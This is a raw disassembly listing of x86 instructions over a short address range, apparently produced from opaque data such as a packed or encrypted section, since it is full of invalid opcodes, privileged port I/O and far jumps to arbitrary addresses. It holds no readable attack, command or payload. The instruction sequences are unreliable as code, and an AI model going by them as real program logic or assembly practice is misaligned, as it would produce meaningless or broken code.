  42acb0:	or     bl,BYTE PTR [edx]
  42acb2:	pop    ebp
  42acb3:	adc    bl,BYTE PTR [edx+esi*2+0x11]
  42acb7:	adc    DWORD PTR [ebx-0x7deece0],edx
  42acbd:	push   edi
  42acbe:	mov    dh,0x42
  42acc0:	mov    ds:0x10e3d10d,al
  42acc5:	and    eax,0x184ab2a4
  42acca:	cdq    
  42accb:	adc    eax,0x7d047ffc
  42acd0:	and    esp,DWORD PTR [esi]
  42acd2:	sbb    DWORD PTR [edi+0xc],ecx
  42acd5:	pop    ss
  42acd6:	mov    cl,0x86
  42acd8:	add    al,0xc2
  42acda:	pop    ebp
  42acdb:	fistp  DWORD PTR [ebp+0x8]
  42acde:	fstp   QWORD PTR [eax]
  42ace0:	test   ebp,esi
  42ace2:	ret    
  42ace3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ace4:	push   eax
  42ace5:	sub    dl,cl
  42ace7:	js     0x42acf3
  42ace9:	pop    eax
  42acea:	or     ebx,edi
  42acec:	jo     0x42acb0
  42acee:	or     esp,edi
  42acf0:	add    dh,BYTE PTR [eax+0x7a]
  42acf3:	xor    al,0xe7
  42acf5:	jg     0x42ad1e
  42acf7:	mov    ah,0x35
  42acf9:	xor    eax,0xa1f0f216
  42acfe:	pusha  
  42acff:	pop    edi
  42ad00:	or     DWORD PTR [edi+0x55],esp
  42ad03:	jb     0x42acdf
  42ad05:	sub    al,0xff
  42ad07:	out    dx,al
  42ad08:	xlat   BYTE PTR ds:[ebx]
  42ad09:	ds imul esp,esp,0xffffff8d
  42ad0d:	xor    BYTE PTR [ebx+0x42],ch
  42ad10:	or     BYTE PTR [ecx-0x67a667bf],0xb3
  42ad17:	loop   0x42aced
  42ad19:	inc    esp
  42ad1a:	and    BYTE PTR [ecx-0x27],ch
  42ad1d:	jg     0x42acf3
  42ad1f:	loopne 0x42ad55
  42ad21:	loope  0x42ad7d
  42ad23:	scas   eax,DWORD PTR es:[edi]
  42ad24:	lods   al,BYTE PTR ds:[esi]
  42ad25:	jle    0x42ad10
  42ad27:	pusha  
  42ad28:	enter  0xc783,0x6a
  42ad2c:	ds inc esp
  42ad2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad2f:	or     bl,BYTE PTR [edx-0x1a8b2af7]
  42ad35:	jae    0x42ad6f
  42ad37:	cs xchg ecx,eax
  42ad39:	jo     0x42ace7
  42ad3b:	ja     0x42ad9e
  42ad3d:	xchg   esi,eax
  42ad3e:	outs   dx,BYTE PTR ds:[esi]
  42ad3f:	shr    ch,1
  42ad41:	ss popa 
  42ad43:	test   ax,0x9d8c
  42ad47:	or     eax,0x3e5c5836
  42ad4c:	or     al,0x67
  42ad4e:	imul   edi,DWORD PTR [eax-0x4a7faed0],0x42
  42ad55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad56:	push   ebp
  42ad57:	jge    0x42ad6c
  42ad59:	scas   al,BYTE PTR es:[edi]
  42ad5a:	adc    ah,dh
  42ad5c:	ins    DWORD PTR es:[edi],dx
  42ad5d:	mov    ds,WORD PTR [ecx-0x2f]
  42ad60:	inc    eax
  42ad61:	div    al
  42ad63:	pop    eax
  42ad64:	cmp    al,0x87
  42ad66:	jbe    0x42ad9a
  42ad68:	inc    ebx
  42ad69:	fbstp  TBYTE PTR [ebx]
  42ad6b:	mov    bh,0x80
  42ad6d:	jns    0x42adc1
  42ad6f:	ja     0x42adb8
  42ad71:	mov    cl,0x5c
  42ad73:	and    cl,ah
  42ad75:	pop    ebp
  42ad76:	and    BYTE PTR [edi+0x33c1e7a1],0x83
  42ad7d:	xor    BYTE PTR [ebx],bh
  42ad7f:	jg     0x42ad0e
  42ad81:	mov    DWORD PTR [eax+0x7c],esi
  42ad84:	push   ss
  42ad85:	cmp    bl,ch
  42ad87:	(bad)  
  42ad88:	std    
  42ad89:	inc    ebx
  42ad8a:	mov    esp,0xc1cfd8a7
  42ad8f:	loope  0x42ade0
  42ad91:	cs cwde 
  42ad93:	xor    eax,DWORD PTR [esi+0x36]
  42ad96:	pop    edx
  42ad97:	mov    ah,0xb3
  42ad99:	jb     0x42ad6e
  42ad9b:	add    esp,DWORD PTR [ecx-0x74]
  42ad9e:	pop    ds
  42ad9f:	retf   
  42ada0:	mov    ds:0x8de37512,eax
  42ada5:	xor    DWORD PTR [edx],edx
  42ada7:	fsub   QWORD PTR [esp+ebp*8]
  42adaa:	pop    edi
  42adab:	and    ah,dh
  42adad:	and    eax,DWORD PTR [di-0x10]
  42adb1:	inc    ecx
  42adb2:	cmp    bl,ah
  42adb4:	mov    ds:0x3453b82d,al
  42adb9:	lea    esp,[ecx]
  42adbb:	(bad)  
  42adbc:	out    dx,al
  42adbd:	mov    edi,DWORD PTR [eax]
  42adbf:	mov    al,0x7f
  42adc1:	mov    ah,0x80
  42adc3:	mov    esi,DWORD PTR [eax+ebp*4+0x43]
  42adc7:	test   ah,dh
  42adc9:	imul   ecx,DWORD PTR es:[ebp+0x6f],0x5cc2b46f
  42add1:	lods   eax,DWORD PTR ds:[esi]
  42add2:	bound  edx,QWORD PTR [esi+0x4c996504]
  42add8:	(bad)  
  42add9:	stc    
  42adda:	call   0x61fc:0x16839b05
  42ade1:	mov    dh,0x4
  42ade3:	rol    DWORD PTR [edx],1
  42ade5:	xor    BYTE PTR [edx-0x58],al
  42ade8:	loopne 0x42ade5
  42adea:	aaa    
  42adeb:	pop    ecx
  42adec:	lock in al,dx
  42adee:	mov    al,0xf
  42adf0:	cmp    ebx,esi
  42adf2:	fisttp DWORD PTR [ebp+0x209d5e5b]
  42adf8:	rcr    DWORD PTR [eax+0x24d1e5c2],0x4e
  42adff:	das    
  42ae00:	in     al,0x57
  42ae02:	and    al,BYTE PTR [edx-0x34]
  42ae05:	add    eax,0x165e8550
  42ae0a:	mov    ebp,0xa3da15d2
  42ae0f:	data16 adc ch,bl
  42ae12:	mov    fs,WORD PTR [ecx]
  42ae14:	inc    eax
  42ae15:	iret   
  42ae16:	in     al,0xf2
  42ae18:	push   0xb
  42ae1a:	sbb    BYTE PTR [eax-0x5d1f8b2],al
  42ae20:	mov    al,0x5d
  42ae22:	(bad)  
  42ae24:	or     DWORD PTR [ebx-0x1d],0x2cb87469
  42ae2b:	stos   BYTE PTR es:[edi],al
  42ae2c:	je     0x42ae8d
  42ae2e:	mov    ch,0x39
  42ae30:	add    BYTE PTR [ebx],0x4f
  42ae33:	mov    WORD PTR [ebx-0xd],fs
  42ae36:	sahf   
  42ae37:	sbb    BYTE PTR [esp+eax*1+0x4d],ch
  42ae3b:	es push edx
  42ae3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae3e:	mov    ch,0x8b
  42ae40:	add    eax,0x7c65eed2
  42ae45:	aas    
  42ae46:	ins    DWORD PTR es:[edi],dx
  42ae47:	push   ebp
  42ae48:	stos   DWORD PTR es:[edi],eax
  42ae49:	(bad)  
  42ae4a:	and    al,0x7a
  42ae4c:	pop    eax
  42ae4d:	pop    DWORD PTR [edi-0x3e]
  42ae50:	mov    ebp,0x688b5a1f
  42ae55:	xor    cl,BYTE PTR [ecx-0x5ed350cd]
  42ae5b:	loop   0x42ae50
  42ae5d:	bound  ebp,QWORD PTR [eax+0x5753c268]
  42ae63:	adc    bh,al
  42ae65:	cli    
  42ae66:	cmp    di,WORD PTR [esi+0x1342ed37]
  42ae6d:	dec    ecx
  42ae6e:	mov    edi,0xbe24c4f4
  42ae73:	mov    ch,0x94
  42ae75:	xchg   ch,ah
  42ae77:	and    ecx,DWORD PTR [esi]
  42ae79:	sub    BYTE PTR [ebp+0x7b],ch
  42ae7c:	sub    BYTE PTR [edi-0x458b7343],0x8c
  42ae83:	pop    ecx
  42ae84:	cmp    al,ch
  42ae86:	xchg   DWORD PTR [edx],esi
  42ae88:	mov    edx,0x1e45cffd
  42ae8d:	sbb    al,0x82
  42ae8f:	loop   0x42aea3
  42ae91:	inc    edi
  42ae92:	into   
  42ae93:	push   ecx
  42ae94:	sbb    BYTE PTR [bx-0x54],ch
  42ae98:	pop    edi
  42ae99:	out    0xff,eax
  42ae9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae9c:	mov    eax,ds:0xc8723c13
  42aea1:	mov    edi,DWORD PTR [ebp+0x4]
  42aea4:	mov    esp,0xf4aa46f8
  42aea9:	and    ah,dh
  42aeab:	dec    eax
  42aeac:	add    DWORD PTR [ecx+eax*4],esi
  42aeaf:	sbb    dh,dl
  42aeb1:	and    al,0xbe
  42aeb3:	pop    eax
  42aeb4:	in     al,dx
  42aeb5:	pop    ebx
  42aeb6:	push   0x3f9cf97
  42aebb:	cwde   
  42aebc:	mov    ebx,0xde9b0da1
  42aec1:	out    0xc4,eax
  42aec3:	in     al,dx
  42aec4:	mov    ds:0x4d272873,eax
  42aec9:	sbb    BYTE PTR [ebp*1-0x98dd6df],bl
  42aed0:	add    esi,DWORD PTR [esi-0x64]
  42aed3:	dec    edi
  42aed4:	sub    BYTE PTR [eax+0x13],cl
  42aed7:	in     al,dx
  42aed8:	iret   
  42aed9:	shl    BYTE PTR [edx],cl
  42aedb:	xchg   edi,eax
  42aedc:	or     dl,bl
  42aede:	xchg   edi,eax
  42aedf:	or     DWORD PTR gs:[ebp-0x12],edi
  42aee3:	sub    bl,BYTE PTR [esi+ecx*2+0x9]
  42aee7:	out    0x17,eax
  42aee9:	retf   
  42aeea:	call   0xb87cb693
  42aeef:	test   al,0xa0
  42aef1:	xlat   BYTE PTR ds:[ebx]
  42aef2:	ins    DWORD PTR es:[edi],dx
  42aef3:	lds    edi,FWORD PTR [ebp+0x74]
  42aef6:	loope  0x42ae8f
  42aef8:	enter  0xedd6,0x4f
  42aefc:	leave  
  42aefd:	clc    
  42aefe:	in     al,0xd6
  42af00:	add    dh,cl
  42af02:	int    0x97
  42af04:	xchg   ecx,eax
  42af05:	and    ebp,ebp
  42af07:	cwde   
  42af08:	and    esi,esp
  42af0a:	jo     0x42aedb
  42af0c:	push   ds
  42af0d:	cmp    esp,DWORD PTR [edx]
  42af0f:	out    dx,eax
  42af10:	pop    DWORD PTR [edx-0xe]
  42af13:	outs   dx,BYTE PTR ds:[esi]
  42af14:	inc    esp
  42af15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af16:	mul    DWORD PTR [edi]
  42af18:	cmp    BYTE PTR [edi-0x6a],bl
  42af1b:	push   ebp
  42af1c:	fwait
  42af1d:	xchg   edi,eax
  42af1e:	aaa    
  42af1f:	cli    
  42af20:	and    dh,BYTE PTR [edi+ebp*4+0x37]
  42af24:	outs   dx,DWORD PTR ds:[esi]
  42af25:	ins    BYTE PTR es:[edi],dx
  42af26:	inc    eax
  42af27:	xchg   DWORD PTR [esi+0x39],edi
  42af2a:	call   0x130918a3
  42af2f:	fcom   DWORD PTR [eax]
  42af31:	scas   al,BYTE PTR es:[edi]
  42af32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af33:	adc    DWORD PTR [edi],esi
  42af35:	inc    esi
  42af36:	xchg   dl,dh
  42af38:	rcr    bl,1
  42af3a:	xor    cl,0xc6
  42af3d:	out    0xbe,eax
  42af3f:	jp     0x42af5d
  42af41:	sbb    dh,BYTE PTR [ebx-0x4c6f19e6]
  42af47:	sti    
  42af48:	cwde   
  42af49:	dec    esp
  42af4a:	mov    dh,0x9b
  42af4c:	push   eax
  42af4d:	rcr    BYTE PTR [edi+0x44],1
  42af50:	adc    eax,0xdce766f5
  42af55:	jbe    0x42af13
  42af57:	inc    eax
  42af58:	mov    ebx,0xe371eace
  42af5d:	jp     0x42af30
  42af5f:	or     BYTE PTR [esi+0x3e],ah
  42af62:	xchg   DWORD PTR [ecx+ecx*1],esp
  42af65:	div    DWORD PTR [ecx-0x6ed1ef2a]
  42af6b:	mov    ecx,0x608c2d24
  42af70:	mov    ds,WORD PTR [esi]
  42af72:	sahf   
  42af73:	sub    al,0x42
  42af75:	cmp    al,0x48
  42af77:	pop    edi
  42af78:	adc    DWORD PTR [edi+esi*8],ebx
  42af7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af7c:	xchg   BYTE PTR [eax],cl
  42af7e:	stos   BYTE PTR es:[edi],al
  42af7f:	cmp    esp,DWORD PTR gs:[esi+0x8]
  42af83:	fild   WORD PTR [edi-0x18]
  42af86:	xor    BYTE PTR [edi+eax*4],0x1b
  42af8a:	xor    BYTE PTR [esi+0x28],dl
  42af8d:	popa   
  42af8e:	and    edi,DWORD PTR [ebp-0x38]
  42af91:	popa   
  42af92:	adc    eax,0xfb641bf9
  42af97:	dec    edi
  42af98:	push   ss
  42af99:	icebp  
  42af9a:	mov    eax,edi
  42af9c:	cmp    al,0x66
  42af9e:	imul   esp,DWORD PTR [ebx+0x1c],0xca904e86
  42afa5:	cmc    
  42afa6:	add    BYTE PTR [esi+edx*1-0x137f6a33],bl
  42afad:	jmp    0x42b008
  42afaf:	aam    0x4
  42afb1:	cmp    al,BYTE PTR [ebx+0x7f]
  42afb4:	dec    esi
  42afb5:	add    eax,0xe5993636
  42afba:	sbb    al,0x7a
  42afbc:	push   cs
  42afbd:	adc    edx,DWORD PTR [edi+0x4701b3a1]
  42afc3:	mov    al,ds:0x6d3aca2b
  42afc8:	dec    edi
  42afc9:	or     BYTE PTR [edi],bl
  42afcb:	(bad)  
  42afcc:	out    dx,al
  42afcd:	pop    es
  42afce:	sbb    esi,DWORD PTR [eax]
  42afd0:	cli    
  42afd1:	add    WORD PTR [edx],dx
  42afd4:	sbb    eax,0x550b43fc
  42afd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afda:	jmp    0x32ae73eb
  42afdf:	out    dx,al
  42afe0:	not    esi
  42afe2:	mov    al,0xca
  42afe4:	dec    ebp
  42afe5:	pop    es
  42afe6:	xchg   edi,eax
  42afe7:	test   BYTE PTR [ebx-0x78],0x36
  42afeb:	call   0x4543:0xebff9e9f
  42aff2:	mov    ah,0xd3
  42aff4:	fldl2t 
  42aff6:	repnz pop ebx
  42aff8:	lock or ch,ch
  42affb:	add    eax,0x53713bc1
  42b000:	adc    DWORD PTR [ebx],0x1e
  42b003:	or     ecx,DWORD PTR [ebp+0x0]
  42b006:	lods   eax,DWORD PTR ds:[esi]
  42b007:	sti    
  42b008:	inc    ecx
  42b009:	push   edx
  42b00a:	jl     0x42b08a
  42b00c:	mov    bh,0x13
  42b00e:	popa   
  42b00f:	sbb    bh,bl
  42b011:	(bad)  
  42b012:	cdq    
  42b013:	gs jne 0x42b06d
  42b016:	inc    edi
  42b017:	jg     0x42b094
  42b019:	mov    ah,0xd3
  42b01b:	mov    ?,WORD PTR ds:0x7a40f777
  42b021:	ja     0x42b04e
  42b023:	dec    esp
  42b024:	dec    ebx
  42b025:	dec    esi
  42b026:	in     al,0xbe
  42b028:	jnp    0x42b036
  42b02a:	inc    edi
  42b02b:	lahf   
  42b02c:	sbb    esi,eax
  42b02e:	stc    
  42b02f:	dec    esp
  42b030:	pop    ecx
  42b031:	sbb    eax,0xe87688f7
  42b036:	adc    ebx,DWORD PTR [edx+0x28e020]
  42b03c:	pop    ss
  42b03d:	jne    0x42afe8
  42b03f:	dec    esi
  42b040:	shl    dl,0x9f
  42b043:	sub    eax,0x4cff5a0
  42b048:	inc    eax
  42b049:	push   eax
  42b04a:	fnsetpm(287 only) 
  42b04c:	inc    edx
  42b04d:	add    BYTE PTR [esi*2-0x647e0f7a],cl
  42b054:	sbb    edx,DWORD PTR [ebp-0x32]
  42b057:	jb     0x42b014
  42b059:	int    0x84
  42b05b:	clc    
  42b05c:	sar    DWORD PTR [ecx],0x14
  42b05f:	dec    ecx
  42b060:	jnp    0x42b061
  42b062:	(bad)  
  42b064:	data16 icebp 
  42b066:	xchg   edi,eax
  42b067:	imul   eax,DWORD PTR [edx-0x31bb6cf8],0xffffffd1
  42b06e:	int    0x5b
  42b070:	xchg   esi,eax
  42b071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b072:	jmp    0x52ad9e18
  42b077:	ret    
  42b078:	test   al,0xe8
  42b07a:	repnz push 0xffffffb7
  42b07d:	loopne 0x42b07d
  42b07f:	mov    ebx,0x43aeb0ba
  42b084:	rcl    eax,0xb
  42b087:	repz or BYTE PTR [ebp-0x7],dh
  42b08b:	mov    al,0x98
  42b08d:	aaa    
  42b08e:	xchg   ebx,eax
  42b08f:	sub    eax,0xa1b1c264
  42b094:	add    al,0x56
  42b096:	xor    eax,0x233ff1f8
  42b09b:	and    eax,0xd1e9fbb4
  42b0a0:	into   
  42b0a1:	or     al,0xe0
  42b0a3:	imul   esi,DWORD PTR ds:0xd5b7fe9a,0xffffffa3
  42b0aa:	(bad)  
  42b0ab:	inc    ecx
  42b0ac:	jp     0x42b091
  42b0ae:	icebp  
  42b0af:	adc    esi,DWORD PTR [ecx+ebp*1-0x64bf478e]
  42b0b6:	loop   0x42b10c
  42b0b8:	gs stc 
  42b0ba:	lock mov eax,ebp
  42b0bd:	popf   
  42b0be:	rol    DWORD PTR [esi],1
  42b0c0:	aaa    
  42b0c1:	(bad)  
  42b0c3:	xor    ecx,ebp
  42b0c5:	dec    eax
  42b0c6:	jns    0x42b095
  42b0c8:	stc    
  42b0c9:	or     eax,0xd0596f0c
  42b0ce:	xor    ecx,esi
  42b0d0:	or     DWORD PTR [edi],ebp
  42b0d2:	and    al,0xe7
  42b0d4:	mov    ebx,0xe7cae73
  42b0d9:	push   edi
  42b0da:	cmp    ecx,DWORD PTR [esi]
  42b0dc:	fnstenv [esi]
  42b0de:	fs push 0xd8033dcb
  42b0e4:	jmp    0xc8c8410c
  42b0e9:	mov    ?,WORD PTR [esp+ebp*4-0xb]
  42b0ed:	loop   0x42b157
  42b0ef:	lods   al,BYTE PTR ds:[esi]
  42b0f0:	push   ds
  42b0f1:	aaa    
  42b0f2:	jle    0x42b0c6
  42b0f4:	pop    edx
  42b0f6:	lahf   
  42b0f7:	push   ss
  42b0f8:	jo     0x42b0f8
  42b0fa:	cmc    
  42b0fb:	sub    al,0xc2
  42b0fd:	dec    ebp
  42b0fe:	push   ds
  42b0ff:	sbb    al,0x9d
  42b101:	sub    edx,eax
  42b103:	and    DWORD PTR gs:[ebx],esi
  42b106:	test   al,0xe4
  42b108:	inc    eax
  42b109:	int    0x22
  42b10b:	xchg   edx,eax
  42b10c:	mov    gs,WORD PTR [edx+0x4]
  42b10f:	jmp    0xa25d89c1
  42b114:	(bad)  
  42b116:	cmp    DWORD PTR [edx*4+0x1298b4aa],ebp
  42b11d:	out    0xcb,al
  42b11f:	xor    eax,0xefc6934c
  42b124:	and    eax,0x1528a054
  42b129:	mov    ch,0x11
  42b12b:	dec    edx
  42b12c:	add    ebx,0xffffff8a
  42b12f:	push   0xe73786c0
  42b134:	dec    ebx
  42b135:	fcomp  DWORD PTR [eax+esi*1]
  42b138:	mov    ds:0xfe038b6f,eax
  42b13d:	jmp    0x42b0eb
  42b13f:	push   eax
  42b140:	call   0x6c81:0x38ee5023
  42b147:	stos   BYTE PTR es:[edi],al
  42b148:	cmp    BYTE PTR [edi],0x55
  42b14b:	push   0x2b
  42b14d:	sub    eax,eax
  42b14f:	dec    ebx
  42b150:	fcmove st,st(7)
  42b152:	adc    ch,BYTE PTR [esi+0x6d62fcae]
  42b158:	es mov cl,0x44
  42b15c:	cwde   
  42b15d:	int3   
  42b15e:	jnp    0x42b11f
  42b160:	add    ch,bl
  42b162:	mov    ebx,DWORD PTR [edi+0x4ed9ee86]
  42b168:	inc    ecx
  42b169:	aaa    
  42b16a:	or     DWORD PTR [ecx-0x679c3fcd],ebx
  42b170:	pop    ss
  42b171:	jecxz  0x42b128
  42b173:	cmp    ah,bl
  42b175:	enter  0xa419,0xcc
  42b179:	xchg   edx,eax
  42b17a:	sub    edi,esi
  42b17c:	mov    edi,0x424d124a
  42b181:	and    eax,0x382a0a6c
  42b186:	dec    ebx
  42b187:	or     bh,ah
  42b189:	xor    eax,0xe86bd4d2
  42b18e:	cmp    BYTE PTR ds:0x3e45422e,cl
  42b194:	cmp    DWORD PTR [edx+0x416257d8],ebx
  42b19a:	cwde   
  42b19b:	in     eax,dx
  42b19c:	push   ds
  42b19d:	aam    0x79
  42b19f:	ins    BYTE PTR es:[edi],dx
  42b1a0:	cwde   
  42b1a1:	dec    edi
  42b1a2:	sub    al,0xe2
  42b1a4:	jp     0x42b225
  42b1a6:	adc    DWORD PTR [ecx+0x13a719b2],ebp
  42b1ac:	and    eax,0x44616b14
  42b1b1:	jmp    0x4aa6bec6
  42b1b6:	sub    bl,BYTE PTR [ebp-0xa]
  42b1b9:	div    BYTE PTR [eax+0x3f3f4d4b]
  42b1bf:	xor    al,0x9f
  42b1c1:	ror    DWORD PTR [esi+0x411a5276],0x1b
  42b1c8:	sbb    al,0xb5
  42b1ca:	call   0x51b9:0xe77a924a
  42b1d1:	fs call 0xdec2d18b
  42b1d7:	aas    
  42b1d8:	jb     0x42b22c
  42b1da:	fwait
  42b1db:	or     eax,DWORD PTR [esi+0x1f46ff]
  42b1e1:	aaa    
  42b1e2:	inc    esi
  42b1e3:	xor    esi,esi
  42b1e5:	inc    esp
  42b1e6:	fs sahf 
  42b1e8:	inc    ebx
  42b1e9:	xchg   dl,cl
  42b1eb:	fmul   QWORD PTR [ebp-0x58]
  42b1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1ef:	popf   
  42b1f0:	add    eax,0x13f64f9e
  42b1f5:	jo     0x42b1c0
  42b1f7:	cmp    al,0xfb
  42b1f9:	add    BYTE PTR [ecx+edi*4-0x1ece1424],al
  42b200:	call   0x8f29:0x7e20b577
  42b207:	add    ch,BYTE PTR [ecx-0x10]
  42b20a:	and    eax,0x23d746c9
  42b20f:	xchg   esp,eax
  42b210:	pop    eax
  42b211:	sub    BYTE PTR [edx-0x2c6a336b],ah
  42b217:	cmp    DWORD PTR [ebx],edx
  42b219:	jmp    0xbf14:0xa49eb43d
  42b220:	aam    0x9f
  42b222:	sbb    edi,0x22
  42b225:	xchg   edx,eax
  42b226:	jl     0x42b230
  42b228:	in     eax,0x79
  42b22a:	sub    al,0x48
  42b22c:	or     dl,dl
  42b22e:	sbb    ecx,ecx
  42b230:	add    al,0xab
  42b232:	gs mov ecx,0xba2ef41b
  42b238:	(bad)  
  42b239:	dec    edi
  42b23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b23b:	push   0xb63336ec
  42b240:	add    al,0xed
  42b242:	clc    
  42b243:	icebp  
  42b244:	dec    eax
  42b245:	push   ds
  42b246:	inc    ecx
  42b247:	inc    edx
  42b248:	or     eax,0x7c143b77
  42b24d:	cld    
  42b24e:	pop    ebp
  42b24f:	and    DWORD PTR [eax-0xf7c2d9],ebx
  42b255:	fs pop ds
  42b257:	or     eax,0x2fe74c94
  42b25c:	pop    ds
  42b25d:	ret    0xdfe1
  42b260:	xchg   ebx,eax
  42b261:	add    BYTE PTR [eax],ch
  42b263:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42b265:	xchg   BYTE PTR [ebx],dh
  42b267:	aaa    
  42b268:	add    al,0x1f
  42b26a:	jle    0x42b28a
  42b26c:	adc    eax,DWORD PTR [edi+0x39]
  42b26f:	push   esp
  42b270:	daa    
  42b271:	and    BYTE PTR [ebx],bh
  42b273:	jge    0x42b275
  42b275:	cmp    eax,0x9d25ce46
  42b27a:	xor    eax,ebp
  42b27c:	pop    ebp
  42b27d:	dec    edi
  42b27e:	lds    ebp,FWORD PTR [ebx+0x76]
  42b281:	jae    0x42b2c0
  42b283:	(bad)  
  42b284:	ss cli 
  42b286:	xor    DWORD PTR [ecx],edi
  42b288:	xchg   edi,eax
  42b289:	daa    
  42b28a:	call   0xd0a033f4
  42b28f:	adc    dh,BYTE PTR [ebp+0x50b83179]
  42b295:	mov    eax,ds:0xa642b085
  42b29a:	sbb    eax,DWORD PTR [edi+0x42]
  42b29d:	ss mov esp,0x81471e31
  42b2a3:	loopne 0x42b262
  42b2a5:	call   0xb1eaae14
  42b2aa:	or     bh,BYTE PTR [esi]
  42b2ac:	mov    ah,0xb7
  42b2ae:	adc    DWORD PTR [edi-0x2e],esi
  42b2b1:	add    eax,0xe89b8d2e
  42b2b6:	xor    esp,DWORD PTR [ebp+0x34]
  42b2b9:	mov    edi,0xe76305a5
  42b2be:	jb     0x42b2b0
  42b2c0:	xchg   edx,eax
  42b2c1:	push   esp
  42b2c2:	mov    esp,0x32469430
  42b2c7:	xchg   ecx,eax
  42b2c8:	xor    DWORD PTR [ebp+0x66eddcba],0x2a
  42b2cf:	cdq    
  42b2d0:	ret    0x6e03
  42b2d3:	sar    al,cl
  42b2d5:	cmp    eax,DWORD PTR [ebx-0x28]
  42b2d8:	xchg   edi,eax
  42b2d9:	adc    bl,BYTE PTR [ebp+0x34]
  42b2dc:	push   0x3c8f7418
  42b2e1:	test   eax,0x5713fdff
  42b2e6:	mov    bh,0x81
  42b2e8:	dec    esi
  42b2e9:	inc    edx
  42b2ea:	imul   edx
  42b2ec:	pop    esi
  42b2ed:	add    eax,0x26b5706d
  42b2f2:	imul   ebp,DWORD PTR [bp-0x14],0xf5cc630a
  42b2fa:	data16 xchg BYTE PTR [esi+ebp*1-0x7c],bl
  42b2ff:	popa   
  42b300:	mov    edx,0x710a7667
  42b305:	ss pop ebx
  42b307:	push   ebp
  42b308:	fcmovnu st,st(0)
  42b30a:	sbb    al,0xfa
  42b30c:	popa   
  42b30d:	fwait
  42b30e:	scas   eax,DWORD PTR es:[edi]
  42b30f:	xchg   edi,eax
  42b310:	outs   dx,BYTE PTR ds:[esi]
  42b311:	sbb    BYTE PTR [ebp+0x1b],bl
  42b314:	ret    
  42b315:	push   esp
  42b316:	dec    ebx
  42b317:	adc    BYTE PTR [edi],dh
  42b319:	(bad)  
  42b31a:	jge    0x42b330
  42b31c:	into   
  42b31d:	out    dx,al
  42b31e:	or     ch,BYTE PTR [edx-0x1b386541]
  42b324:	jno    0x42b32f
  42b326:	mov    edi,0x3a69cbd
  42b32b:	dec    ebp
  42b32c:	rcr    bh,cl
  42b32e:	ins    BYTE PTR es:[edi],dx
  42b32f:	ret    
  42b330:	dec    esp
  42b331:	scas   al,BYTE PTR es:[edi]
  42b332:	adc    ch,0x41
  42b335:	pop    es
  42b336:	scas   al,BYTE PTR es:[edi]
  42b337:	mov    ds:0xa535ec4d,eax
  42b33c:	xor    DWORD PTR [ecx-0x2d8a1f58],edx
  42b342:	hlt    
  42b343:	xor    al,0x74
  42b345:	xchg   ebp,eax
  42b346:	repnz dec ecx
  42b348:	mov    ah,0xc1
  42b34a:	xor    dl,cl
  42b34c:	sbb    esi,0x162648d9
  42b352:	and    DWORD PTR [ecx-0x630a7bed],eax
  42b358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b359:	sbb    eax,0x6e9cd157
  42b35e:	fldcw  WORD PTR [eax]
  42b360:	or     ch,ah
  42b362:	gs adc al,0x67
  42b365:	leave  
  42b366:	push   es
  42b367:	adc    al,0x61
  42b369:	aad    0xdf
  42b36b:	dec    ebp
  42b36c:	jecxz  0x42b3b7
  42b36e:	mov    ecx,0x79797286
  42b373:	cs fdivr st,st(3)
  42b376:	mov    edi,0x2f73da0
  42b37b:	hlt    
  42b37c:	cmp    al,0x8
  42b37e:	inc    eax
  42b37f:	mov    bh,0x5b
  42b381:	fldenv [ebx-0x29e179e3]
  42b387:	jecxz  0x42b38d
  42b389:	and    DWORD PTR [esi-0x7e],esi
  42b38c:	mov    dl,0x97
  42b38e:	(bad)  [ebp-0x68]
  42b391:	sub    ebx,DWORD PTR [esi+0x4eae02e3]
  42b397:	mov    esp,0x13ee826a
  42b39c:	loopne 0x42b3d4
  42b39e:	fldcw  WORD PTR [eax+ebp*1]
  42b3a1:	push   ebp
  42b3a2:	pop    ds
  42b3a3:	or     DWORD PTR ds:0xfe8206e1,ebp
  42b3a9:	cmp    eax,0x6d07322e
  42b3ae:	push   cs
  42b3af:	jl     0x42b344
  42b3b1:	(bad)  
  42b3b2:	hlt    
  42b3b3:	cs mov edx,0x7274ebe8
  42b3b9:	push   edx
  42b3ba:	je     0x42b33d
  42b3bc:	imul   ebx,edx,0x14921595
  42b3c2:	fwait
  42b3c3:	pop    ebx
  42b3c4:	sbb    esp,DWORD PTR [ecx]
  42b3c6:	pop    ebx
  42b3c7:	popf   
  42b3c8:	call   0x491ac7f1
  42b3cd:	ret    0xe0ee
  42b3d0:	push   eax
  42b3d1:	push   cs
  42b3d2:	addr16 daa 
  42b3d4:	xor    ch,BYTE PTR [edx]
  42b3d6:	imul   esi,DWORD PTR [eax-0x6c],0xffffffe6
  42b3da:	lds    eax,FWORD PTR [ebp+0x28]
  42b3dd:	and    ah,BYTE PTR [eax+0x17]
  42b3e0:	sbb    DWORD PTR [edx-0x5080be9b],esp
  42b3e6:	not    BYTE PTR [esi]
  42b3e8:	mov    esp,0x7d0fb36f
  42b3ed:	cmc    
  42b3ee:	ss or  al,0x4c
  42b3f1:	pop    ss
  42b3f2:	mov    cl,0x81
  42b3f4:	rol    al,1
  42b3f6:	mov    edx,0x26905783
  42b3fb:	mov    al,bh
  42b3fd:	mov    dl,0x8c
  42b3ff:	adc    eax,0x8ace28f6
  42b404:	mov    dh,BYTE PTR fs:[esi+edi*8]
  42b408:	leave  
  42b409:	data16 lahf 
  42b40b:	dec    ebp
  42b40c:	fild   DWORD PTR [ebx-0x64]
  42b40f:	mov    esp,0xa323d1c4
  42b414:	xlat   BYTE PTR ds:[ebx]
  42b415:	lahf   
  42b416:	std    
  42b417:	and    BYTE PTR [edx+esi*1],bl
  42b41a:	in     al,0xe6
